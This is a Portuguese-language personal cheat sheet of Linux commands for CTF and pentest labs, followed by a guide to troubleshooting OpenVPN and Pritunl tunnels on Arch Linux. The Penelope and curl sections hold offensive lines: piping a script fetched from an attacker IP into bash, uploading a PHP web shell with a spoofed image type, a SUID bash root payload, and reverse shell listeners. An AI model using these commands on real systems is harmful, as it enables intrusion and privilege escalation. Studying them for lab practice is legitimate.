 🐧 Linux — Comandos Essenciais

> [!Fonte de onde pego os ensinamentos e dicas]
> https://notebooklm.google.com/notebook/556e39f1-065f-4755-b85c-d3ae7090b385

> Referência rápida de comandos Linux para hacking e administração de sistemas.

---

## 1. 📂 Navegação — Localizando-se no Sistema

Antes de agir, você precisa saber **onde está** e **o que há ao seu redor**.

| Comando | Função | Exemplo |
|---|---|---|
| `pwd` | Onde estou? Exibe o caminho completo do diretório atual | `pwd` → `/home/gbmel` |
| `ls` | O que tem aqui? Lista arquivos e pastas | `ls -la` (inclui ocultos + detalhes) |
| `ls -la` | Lista **tudo**, incluindo permissões, dono, tamanho e arquivos ocultos (`.`) | Essencial para Privilege Escalation |
| `cd` | Mudar de diretório | `cd /var/www/html` |
| `cd ..` | Subir um nível na hierarquia | Sai de `/home/gbmel` para `/home` |
| `cd ~` | Voltar para sua pasta pessoal (home) | Atalho útil |
| `cd -` | Voltar ao diretório anterior | Alterna entre dois diretórios |

> **O `.` no Linux** marca arquivos como **ocultos** (ex: `.bash_history`, `.env`, `.ssh/`). Eles só aparecem com `ls -la`. Em hacking, arquivos ocultos frequentemente guardam **senhas e configurações sensíveis**.

---

## 2. 📝 Manipulação — Criando e Movendo Arquivos

| Comando | Função | Exemplo |
|---|---|---|
| `touch` | Cria um arquivo vazio | `touch exploit.sh` |
| `mkdir` | Cria uma nova pasta | `mkdir -p /tmp/tools` (-p cria intermediárias) |
| `cp` | Copia arquivos ou pastas (`-r` para pastas) | `cp shell.php /var/www/html/` |
| `mv` | Move ou renomeia arquivos/pastas | `mv script.py /tmp/` |
| `rm` | Remove arquivos | `rm arquivo.txt` |
| `rm -rf` | Remove pasta inteira **sem confirmação** | ⚠️ **Sem lixeira!** Irreversível! |
| `chmod` | Altera permissões de arquivos | `chmod +x script.sh` (torna executável) |
| `chown` | Altera o dono de um arquivo | `chown root:root file` |

---

## 3. 🔍 Visualização e Busca — Analisando Conteúdo

Essencial para ler configurações ou encontrar informações em textos longos.

| Comando | Função | Uso em Hacking |
|---|---|---|
| `cat` | Exibe todo o conteúdo de um arquivo | `cat /etc/passwd` |
| `less` / `more` | Abre o arquivo por páginas (navegar com setas) | Arquivos grandes sem poluir o terminal |
| `head -n 20` | Exibe as primeiras 20 linhas | Verificar início de logs |
| `tail -n 20` | Exibe as últimas 20 linhas | Verificar logs recentes |
| `tail -f` | Monitora um arquivo em tempo real | `tail -f /var/log/auth.log` |
| `grep` | Pesquisa palavras/padrões dentro de arquivos | **Comando mais usado em segurança!** |
| `grep -r "password" /etc/` | Busca recursiva por "password" em todos os arquivos de /etc | Encontrar senhas em configs |
| `grep -i` | Busca case-insensitive | `grep -i "secret" .env` |
| `find` | Busca arquivos por nome, tipo, permissão | `find / -name "*.conf"` |
| `find / -perm -u=s` | Busca binários com SUID | **Fundamental para PrivEsc!** |
| `wc -l` | Conta número de linhas | `cat /etc/passwd \| wc -l` |

---

## 4. 👤 Sistema e Identidade — Quem é você?

| Comando | Função | Uso em Hacking |
|---|---|---|
| `whoami` | Mostra o usuário logado | Primeira coisa após obter shell |
| `id` | Mostra UID, GID e grupos | Verificar grupos especiais (docker, lxd) |
| `sudo -l` | Lista o que pode executar como root | **Vetor #1 de PrivEsc!** |
| `sudo su` | Virar root (se tiver permissão) | Escalar privilégios |
| `su usuario` | Trocar para outro usuário | Pivotar com credenciais encontradas |
| `uname -a` | Versão do kernel e sistema | Buscar kernel exploits |
| `cat /etc/os-release` | Distribuição e versão do OS | Identificar o sistema |
| `df -h` | Espaço livre em disco (legível) | Verificar partições |
| `free -h` | Uso de memória RAM | Diagnóstico do sistema |
| `env` | Mostra variáveis de ambiente | Pode conter senhas/tokens! |
| `history` | Histórico de comandos do usuário | Procurar senhas digitadas |

---

## 5. ⚙️ Processos e Rede — O que o sistema está fazendo?

| Comando | Função | Uso em Hacking |
|---|---|---|
| `ps aux` | Lista TODOS os processos rodando | Identificar serviços/processos de root |
| `top` / `htop` | Consumo de CPU e RAM em tempo real | Monitoramento |
| `kill [PID]` | Encerra um processo pelo ID | Matar processos travados |
| `kill -9 [PID]` | Força encerramento | Quando `kill` normal não funciona |
| `ping` | Testa conectividade com IP/host | Verificar se o alvo está vivo |
| `ifconfig` / `ip addr` | Configurações de rede e IP | Descobrir interfaces e IPs |
| `ip route` | Tabela de roteamento | Identificar o gateway |
| `netstat -tulnp` | Portas abertas e serviços escutando | Encontrar serviços internos |
| `ss -tulnp` | Alternativa moderna ao netstat | Mesmo uso |
| `curl` / `wget` | Transferência de arquivos e requisições HTTP | Ver seção dedicada: [[#10. 🌐 cURL — Canivete Suíço HTTP]] |

---

## 6. 📦 Gerenciamento de Pacotes

| Distro | Instalar | Atualizar | Buscar |
|---|---|---|---|
| **Debian/Kali/Ubuntu** | `sudo apt install pacote` | `sudo apt update && sudo apt upgrade` | `apt search pacote` |
| **Arch/BlackArch** | `sudo pacman -S pacote` | `sudo pacman -Syu` | `pacman -Ss pacote` |

---

## 7. 🔐 Permissões Linux — Entendendo o `ls -la`

```
-rwxr-xr-x  1  root  root  4096  Jan 15 10:00  script.sh
│├─┤├─┤├─┤  │  │     │     │     │              └── Nome do arquivo
││  │  │    │  │     │     │     └── Data de modificação
││  │  │    │  │     │     └── Tamanho em bytes
││  │  │    │  │     └── Grupo dono
││  │  │    │  └── Usuário dono
││  │  │    └── Número de links
││  │  └── Permissões de OUTROS (o+rwx)
││  └── Permissões do GRUPO (g+rwx)
│└── Permissões do DONO (u+rwx)
└── Tipo (- = arquivo, d = diretório, l = link)
```

| Letra | Valor | Significado |
|---|---|---|
| `r` | 4 | Read (ler) |
| `w` | 2 | Write (escrever) |
| `x` | 1 | Execute (executar) |

```bash
chmod 777 arquivo    # rwxrwxrwx — todos podem tudo (INSEGURO!)
chmod 755 arquivo    # rwxr-xr-x — dono faz tudo, resto lê/executa
chmod 644 arquivo    # rw-r--r-- — dono lê/escreve, resto só lê
chmod +s arquivo     # SUID bit — executa como DONO do arquivo (perigo!)
```

> **Em hacking:** `chmod +s /bin/bash` seguido de `bash -p` = root instantâneo. É o payload mais comum de privilege escalation.

---

## 8. 🔧 Redirecionamento e Pipes

| Símbolo | Função | Exemplo |
|---|---|---|
| `>` | Redireciona saída para arquivo (sobrescreve) | `echo "payload" > shell.sh` |
| `>>` | Redireciona saída (append — adiciona ao final) | `echo "linha" >> arquivo.txt` |
| `\|` | Pipe — envia saída de um comando como entrada de outro | `cat /etc/passwd \| grep root` |
| `2>/dev/null` | Descarta mensagens de erro | `find / -name "*.conf" 2>/dev/null` |
| `&` | Executa em background | `nc -lvnp 4444 &` |
| `&&` | Executa o próximo SE o anterior funcionar | `cd /tmp && wget http://...` |

---

## 9. 🐚 Penelope — Reverse Shell Handler

> **O que é:** Substituto avançado do `nc -lvnp`. Recebe reverse shells e faz upgrade automático para TTY interativa.
> **GitHub:** https://github.com/brightio/penelope
> **Caminho:** `/home/gbmel/.local/bin/penelope`

### Iniciar o Listener
```bash
# Listener na porta 4444 (padrão)
penelope

# Listener em porta específica
penelope -p 9001

# Listener em múltiplas portas ao mesmo tempo
penelope -p 4444,5555,6666

# Listener em interface específica (padrão: 0.0.0.0 = todas)
penelope -i 10.10.14.5

# Iniciar já no menu principal (sem esperar shell)
penelope -M
```

### Flags Importantes
```bash
penelope -a              # Mostra payloads de reverse shell prontos para copiar!
penelope -l              # Lista interfaces de rede disponíveis
penelope -L              # Desabilita log de sessão
penelope -S              # Aceita apenas 1 sessão (single session)
penelope -C              # Não auto-attach em novas sessões
penelope -U              # Desabilita upgrade automático da shell
penelope -O              # Modo OSCP-safe (sem ferramentas extras)
penelope -m 3            # Manter 3 sessões por alvo
```

### Servidor HTTP (transferir arquivos para o alvo)
```bash
# Servir arquivos da pasta atual na porta 8000
penelope -s

# Servir em porta específica
penelope -s -p 8080

# No alvo, baixar com:
# wget http://SEU_IP:8000/linpeas.sh
```

### Bind Shell (conectar a uma porta aberta no alvo)
```bash
# Conectar a um bind shell no alvo
penelope -c ALVO_IP -p PORTA
```

### Comandos Internos (dentro da Penelope)

**Após receber uma shell, use estes comandos:**

| Comando | Função |
|---|---|
| `Ctrl+C` | **Vai para o menu** (NÃO mata a sessão!) |
| `Enter` | Volta para a sessão ativa |
| `sessions` | Lista todas as shells conectadas |
| `use 1` | Troca para sessão nº 1 |
| `download /etc/passwd` | Baixa arquivo do alvo → sua máquina |
| `upload linpeas.sh /tmp/` | Envia arquivo sua máquina → alvo |
| `spawn` | Abre novo listener em outra porta |
| `upgrade` | Força upgrade para PTY (geralmente automático) |
| `dir` | Muda o diretório de downloads |
| `kill 1` | Encerra sessão nº 1 |
| `exit` | Sai da Penelope |

> **Dica:** Use `penelope -a` quando já estiver no listener — ele gera e mostra os payloads de reverse shell prontos para copiar e colar no alvo!

---

## 10. 🌐 cURL — Canivete Suíço HTTP e Transferência

> **O que é:** Ferramenta de linha de comando para transferência de dados utilizando múltiplos protocolos (HTTP, HTTPS, FTP, FTPS, SFTP, etc.). Em pentest e CTF, funciona como um navegador sem interface gráfica para interagir diretamente com APIs, debugar cabeçalhos, testar injeções e transferir arquivos para o alvo.

### 10.1 Tabela de Flags Essenciais

| Flag (Curta) | Flag (Longa) | Função | Exemplo de Aplicação |
|---|---|---|---|
| `-I` | `--head` | Retorna apenas os cabeçalhos de resposta (HEAD request) | Banner grabbing rápido de web servers |
| `-i` | `--include` | Inclui cabeçalhos HTTP junto com o corpo da resposta | Análise de cookies (`Set-Cookie`) e status codes |
| `-v` | `--verbose` | Modo verboso: exibe o handshake TLS, request e response | Diagnóstico de conexão e depuração profunda |
| `-s` | `--silent` | Modo silencioso (oculta barra de progresso e erros) | Uso em pipelines e scripts bash (`grep`, `jq`) |
| `-o <arq>` | `--output <arq>` | Salva a resposta no arquivo especificado | Download direto com controle de nome |
| `-O` | `--remote-name` | Salva o arquivo preservando o nome original da URL | Download rápido de exploits/scripts |
| `-X <MÉT>` | `--request <MÉT>` | Especifica o método HTTP (`GET`, `POST`, `PUT`, `DELETE`) | Interação com rotas de API |
| `-d <dado>`| `--data <dado>` | Envia dados no body (POST por padrão com `form-urlencoded`) | Submissão de parâmetros ou JSON |
| `-H <cab>` | `--header <cab>` | Adiciona um cabeçalho HTTP personalizado | Injeção de `Authorization: Bearer`, `Content-Type` |
| `-L` | `--location` | Segue redirecionamentos automáticos (`301`, `302`, `307`) | Evita parar em páginas de redirect |
| `-k` | `--insecure` | Permite conexões TLS/SSL com certificados inválidos/autoassinados | CTFs e ambientes internos sem certificado válido |
| `-x <prx>` | `--proxy <prx>` | Roteia o tráfego através de um proxy HTTP/SOCKS | Envio direto para o Burp Suite (`http://127.0.0.1:8080`) |
| `-u <u:s>` | `--user <u:s>` | Autenticação HTTP Basic ou Digest (`usuario:senha`) | Acesso a painéis protegidos por `.htaccess` |
| `-b <ck>`  | `--cookie <ck>` | Envia cookies no request (string direta ou arquivo) | Sessão autenticada (`PHPSESSID=...`) |
| `-c <arq>` | `--cookie-jar <arq>` | Salva os cookies recebidos da resposta em um arquivo | Persistência de sessão pós-login |
| `-F <f=v>` | `--form <f=v>` | Envia dados como `multipart/form-data` | Upload de arquivos e WebShells |

---

### 10.2 Modos de Uso Práticos

#### 1. Reconhecimento Rápido e Análise de Headers
```bash
# Obter apenas os cabeçalhos (Status Code, Server, X-Powered-By)
curl -I https://alvo.com

# Seguir redirects silenciosamente e retornar apenas o HTTP Status Code final
curl -s -L -o /dev/null -w "%{http_code}\n" https://alvo.com
```

#### 2. Interação com APIs REST e GraphQL
```bash
# Requisição POST enviando JSON autenticado via Bearer Token
curl -s -X POST "https://alvo.com/api/v1/profile" \
  -H "Authorization: Bearer SEU_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","debug":true}'
```

#### 3. Rotear Tráfego para o Burp Suite
```bash
# Enviar requisição direta para o Burp Suite local (porta padrão 8080) com bypass SSL
curl -k -x http://127.0.0.1:8080 https://alvo.com/login
```

#### 4. Transferência de Arquivos no Alvo (Post-Exploitation)
```bash
# No host comprometido: baixar ferramenta da máquina atacante e salvar em /tmp
curl -s http://10.10.14.2:8000/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh

# Execução direta na memória via pipe (sem tocar o disco)
curl -s http://10.10.14.2:8000/linpeas.sh | bash
```

#### 5. Upload de Arquivos / Multipart Form Data
```bash
# Simular upload de arquivo (o '@' indica caminho local do arquivo)
curl -X POST "https://alvo.com/upload" \
  -H "Cookie: PHPSESSID=session_ativa" \
  -F "avatar=@/tmp/shell.php;type=image/png" \
  -F "submit=Upload"
```

> **Relacionado:** [[Process of Hacking]] (Reconhecimento) • [[OWASP API Top 10]] (Testes de endpoints de API) • [[Linux Privilege Escalation]] (Transferência de enum scripts)

---

## Troubleshooting de Redes, Processos e VPN (OpenVPN/Pritunl)

> Referência teórica de protocolos, camadas e roteamento: [[REDES -]]
> Guia operacional para auditoria manual de processos, interfaces virtuais `tun`, tabelas de rotas e estabilização de túneis VPN (OpenVPN / Pritunl Client) no Arch Linux.

### Tabela Comparativa de Ferramentas de Diagnóstico

| Ferramenta / Comando | Camada / Escopo | Finalidade Principal | Exemplo Operacional |
|---|---|---|---|
| `pgrep` / `ps` | Processos / SO | Identificar PIDs ativos, inspecionar linha de comando e detectar processos órfãos em background | `pgrep -a openvpn` |
| `ip a` / `ip link` | Camada 2 / 3 | Auditar status (`UP`/`DOWN`), flags, MTU e estatísticas de pacotes/erros em interfaces físicas e `tun` | `ip -s link show dev tun0` |
| `ip route` | Camada 3 (Rede) | Inspecionar gateway padrão, métricas de rota e rotas injetadas via VPN (prevenção de routing leak) | `ip route show table main` |
| `ss` | Camada 4 (Transporte) | Auditar sockets abertos, buffers de transmissão (`Send-Q`/`Recv-Q`) e mapear portas UDP/TCP a PIDs | `ss -uap` |
| `openvpn --verb` | Aplicação / Túnel | Nível de log em tempo real para depuração de handshake TLS, keepalive e negociação de cifras | `openvpn --config lab.ovpn --verb 4` |

---

### 1. Auditoria e Rastreio de Processos (OpenVPN & Pritunl)

Instâncias do OpenVPN ou do serviço em background do Pritunl (`pritunl-client` / `pritunl-client-service`) podem travar silenciosamente, retendo sockets abertos e a interface virtual `tun`.

```bash
# Localizar todos os processos do OpenVPN exibindo a linha de comando completa com argumentos (-a)
pgrep -a openvpn

# Listar processos em hierarquia de árvore (--forest), exibindo PID, PPID, usuário e comando
ps -eo pid,ppid,user,stat,comm,args --forest | grep -E "openvpn|pritunl"

# Encerrar graciosamente processo travado pelo PID (SIGTERM - 15)
kill -15 <PID>

# Forçar encerramento imediato caso o processo ignore o SIGTERM (SIGKILL - 9)
kill -9 <PID>
```

> [!WARNING]
> **Detecção de Processos Órfãos (`PPID 1`):**
> Quando o processo pai (uma janela de terminal encerrada incorretamente, um script wrapper ou a interface GUI do Pritunl) morre sem fechar a sessão da VPN, o processo do OpenVPN é adotado pelo `init`/`systemd` (`PPID 1`).
> Esse processo órfão permanece em execução oculta, mantendo a interface `tun0` alocada e retendo as rotas de rede no kernel. Ao tentar reconectar, ocorrem erros de dispositivo ocupado (`TUN/TAP device tun0 already exists`) ou portas UDP travadas.
> Para auditar e isolar processos órfãos da VPN:
> ```bash
> ps -ef | awk '$3 == 1 && /openvpn|pritunl/ {print "PID:", $2, "| PPID:", $3, "| CMD:", $8, $9}'
> ```

---

### 2. Inspeção de Interfaces de Rede e Estatísticas (`iproute2`)

A interface de túnel (`tun0`, `tun1` ou `pritunl...`) é criada no kernel através do driver virtual universal `tun`.

```bash
# Listar todas as interfaces com endereçamento IPv4/IPv6 de forma concisa e resumida (-br)
ip -br a

# Inspecionar detalhes da interface virtual tun0 (status UP/DOWN, MTU e escopo)
ip a show dev tun0

# Exibir estatísticas detalhadas (-s: contadores de bytes, pacotes transmitidos, erros RX/TX e drops)
ip -s link show dev tun0

# Derrubar e remover manualmente interface tun residual deixada por processo finalizado incorretamente
sudo ip link set dev tun0 down
sudo ip link delete dev tun0
```

> [!NOTE]
> No Arch Linux, o módulo `tun` deve estar presente no kernel. Se a criação da interface falhar com o erro `Cannot open TUN/TAP dev /dev/net/tun: No such file or directory`, carregue o módulo manualmente:
> ```bash
> lsmod | grep tun || sudo modprobe tun
> ```

---

### 3. Diagnóstico de Rotas e Prevenção de Routing Leak

Ao estabelecer o túnel, o OpenVPN aplica rotas para direcionar o tráfego do laboratório para o gateway da VPN. Caso as métricas ou sub-redes estejam incorretas, os pacotes podem vazar pela interface física local ou interromper o acesso à rede do alvo.

```bash
# Exibir a tabela de rotas padrão do sistema
ip route show

# Identificar exatamente por qual interface e gateway um IP de destino (ex: máquina do HTB/CTF) será alcançado
ip route get 10.10.10.10

# Adicionar manualmente rota estática para a sub-rede do laboratório apontando para a interface tun0
sudo ip route add 10.10.10.0/24 dev tun0

# Deletar rota conflitante que esteja roteando tráfego do laboratório para o gateway local (ex: wlan0)
sudo ip route del 10.10.10.0/24 dev wlan0
```

---

### 4. Análise de Sockets e Portas com `ss`

O OpenVPN utiliza primariamente datagramas UDP (portas 1194, 1195 ou portas dinâmicas no Pritunl). O `ss` inspeciona as estruturas de socket diretamente via `netlink`.

```bash
# Listar sockets UDP (-u), exibindo conexões ativas e ouvintes (-a) com o PID/nome do processo (-p)
# Requer sudo para visualizar o PID de daemons e processos que não pertencem ao usuário atual
sudo ss -uap

# Filtrar sockets especificando a porta de comunicação do túnel VPN (ex: porta 1194)
sudo ss -uap '( sport = :1194 or dport = :1194 )'

# Visualizar buffers de recebimento (Recv-Q) e envio (Send-Q) em sockets UDP numéricos (-n)
sudo ss -unap
```

> [!NOTE]
> Filas persistentemente preenchidas em `Recv-Q` (pacotes recebidos do túnel aguardando leitura pela aplicação) ou `Send-Q` (pacotes criptografados aguardando envio pelo socket) indicam saturação de banda, oscilação severa de rota ou gargalo de processamento da cifra criptográfica na CPU.

---

### 5. Estabilidade de Conexão, MTU e Keepalive

Em redes Wi-Fi domésticas, conexões com perda de pacotes ou ISPs sob CGNAT, túneis UDP sofrem quedas periódicas ou travam transferências extensas.

```bash
# Executar o OpenVPN em foreground com verbosidade elevada (--verb 4 exibe eventos de pacote e keepalive)
sudo openvpn --config /caminho/lab.ovpn --verb 4

# Testar o Path MTU até o gateway da VPN sem fragmentar (-M do: ativa DF bit; -s: tamanho do payload ICMP)
ping -M do -s 1472 10.10.14.1
```

> [!WARNING]
> **Quedas por Timeout de Keepalive (`ping-restart 60`):**
> Em conexões Wi-Fi com oscilação ou perda temporária de datagramas UDP, as mensagens de keepalive do OpenVPN podem ser descartadas.
> A diretiva padrão do OpenVPN `keepalive 10 60` envia um pacote ping a cada 10 segundos e, se 60 segundos se passarem sem resposta do servidor remoto, a conexão é declarada morta (`[soft,ping-restart]`), disparando:
> `Inactivity timeout (--ping-restart), restarting`.
> Para estabilizar conexões instáveis, adicione ou substitua no arquivo `.ovpn`:
> ```text
> keepalive 10 120
> ping-restart 120
> ```

> [!TIP]
> **Ajustes de Estabilização de MTU (`mssfix 1360`):**
> O MTU padrão da rede física é 1500 bytes. O encapsulamento do túnel adiciona overhead significativo: cabeçalho IP (20 bytes) + UDP (8 bytes) + cabeçalho OpenVPN + vetor de inicialização (IV) e HMAC de integridade.
> Pacotes que atingem 1500 bytes no túnel ultrapassam o MTU físico externo, provocando fragmentação IP ou descarte silencioso em roteadores intermediários (MTU Black Hole).
> **Sintoma típico:** O `ping` funciona normalmente, mas conexões SSH, varreduras do `nmap` ou requisições HTTP via `curl` congelam sem retornar dados.
> Para solucionar, force o ajuste do Maximum Segment Size do TCP no arquivo `.ovpn`:
> ```text
> tun-mtu 1500
> mssfix 1360
> ```
> O `mssfix 1360` instrui o OpenVPN a interceptar e reescrever o MSS dos pacotes TCP que passam pelo túnel para no máximo 1360 bytes, assegurando que o pacote final encapsulado nunca exceda o limite de 1500 bytes da interface física.

---

### 6. Procedimento de Recuperação Rápida no Arch Linux

Quando a VPN do HTB, Hacking Club ou Pritunl travar ou apresentar falha de conexão:

```bash
# 1. Encerrar imediatamente instâncias órfãs ou duplicadas do OpenVPN e Pritunl
sudo killall -9 openvpn pritunl-client 2>/dev/null

# 2. Deletar interfaces tun presas no kernel
sudo ip link delete dev tun0 2>/dev/null

# 3. Validar se o daemon de DNS (systemd-resolved) não reteve servidores inacessíveis
resolvectl status 2>/dev/null || cat /etc/resolv.conf

# 4. Iniciar conexão aplicando estabilização de MSS e verbosidade controlada
sudo openvpn --config lab.ovpn --mssfix 1360 --verb 3
```

> **Links Bidirecionais:** [[REDES -]] (Conceitos teóricos de TCP, UDP, Camadas OSI e Roteamento) • [[Kali linux & Arch e minhas anotações basicas]]